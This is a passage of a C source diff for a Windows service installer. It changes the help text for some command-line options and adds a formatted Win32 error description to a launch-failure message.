-					printf("  --masterservice-source=\"path\"       Stage MasterService.exe from a specific source path.\r\n");
-					printf("  --masterservice=0|1                  Disable/enable MasterService integration gates (default: 1).\r\n");
+					printf("  --package-source=\"path\"             Override package source used by -validate-package.\r\n");
+					printf("  --allow-installed-fallback=0|1       Allow installed .msh/.conf fallback during -validate-package.\r\n");
 				}
 				else if (skip == 0)
 				{
@@ -4097,7 +9532,9 @@ INT_PTR CALLBACK DialogHandler(HWND hDlg, UINT message, WPARAM wParam, LPARAM lP
 				}
 				else if (launchError != ERROR_SUCCESS)
 				{
-					StringCchPrintfW(errorMessage, _countof(errorMessage), L"%ls failed to launch (error=%lu).", actionName, launchError);
+					WCHAR launchErrorText[256];
+					MeshService_FormatWin32ErrorMessageW(launchError, launchErrorText, _countof(launchErrorText));
+					StringCchPrintfW(errorMessage, _countof(errorMessage), L"%ls failed to launch (error=%lu: %ls).", actionName, launchError, launchErrorText);
 				}
 				else
 				{
